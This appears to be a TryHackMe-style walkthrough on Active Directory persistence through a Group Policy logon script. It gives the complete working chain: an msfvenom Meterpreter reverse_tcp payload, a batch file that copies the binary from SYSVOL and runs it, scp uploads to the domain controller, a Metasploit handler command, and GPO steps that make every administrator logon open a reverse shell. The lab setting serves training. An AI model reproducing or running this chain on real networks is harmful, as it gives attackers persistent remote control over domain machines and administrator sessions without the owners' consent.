The following are some common GPO persistence techniques:

1-Restricted Group Membership - This could allow us administrative access to all hosts in the domain
2-Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain. <br>

Since we already used the first hook, Restricted Group Membership. Let's now focus on the second hook.

**Preparation**

Before we can create the GPO. We first need to create our shell:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<the receiver ip> lport=9876 -f exe > shell.exe
```
Another file should be created called ```script.bat```:
```
copy \\domainname\sysvol\domain\scripts\shell.exe C:\tmp\shell.exe && timeout /t 20 && C:\tmp\shell.exe
```
You will see that the script executes three commands chained together with &&. The script will copy the binary from the SYSVOL directory to the local machine, then wait 20 seconds, before finally executing the binary.
> note

When using a Group Policy Object (GPO) to perform logon scripts in an Active Directory (AD) environment, the scripts are stored and accessed through the SYSVOL share. The network share path where these scripts are typically located is:
Path for Scripts in SYSVOL: ```\\domainname\SYSVOL\domain\scripts```

Now we need to move these files to the target machine(**tryhackme** cuz we have the admin creds, for example):
```
scp shell.exe Administrator@thmdc.za.tryhackme.loc:/C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
scp script.bat Administrator@thmdc.za.tryhackme.loc:/C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Finally, let's start our MSF listener:
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <the receiver ip>; set LPORT 9876;exploit"
```
With our prep now complete, we can finally create the GPO that will execute it.

**GPO Creation**

> this action need administative access

The first step uses our Domain Admin account to open the Group Policy Management snap-in:

    In your ****runas-spawned**** terminal, type MMC and press enter.
    Click on File->Add/Remove Snap-in...
    Select the Group Policy Management snap-in and click Add
    Click OK
We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name, then Right-click on your policy and select Enforced.
> the goal here is when any admin in the AD env make a logon action we should receive reverse connection.

Let's get back to our Group Policy Management Editor:

    Under User Configuration, expand Policies->Windows Settings.
    Select Scripts (Logon/Logoff).
    Right-click on Logon->Properties
    Select the Scripts tab.
    Click Add->Browse.
now navigate to where we stored our Batch and binary files, Select your Batch file as the script and click Open and OK. Click Apply and OK. This will now ensure that every time one of the administrators logs into any machine, we will get a callback.
<br>
Finally we get the meterpreter session.














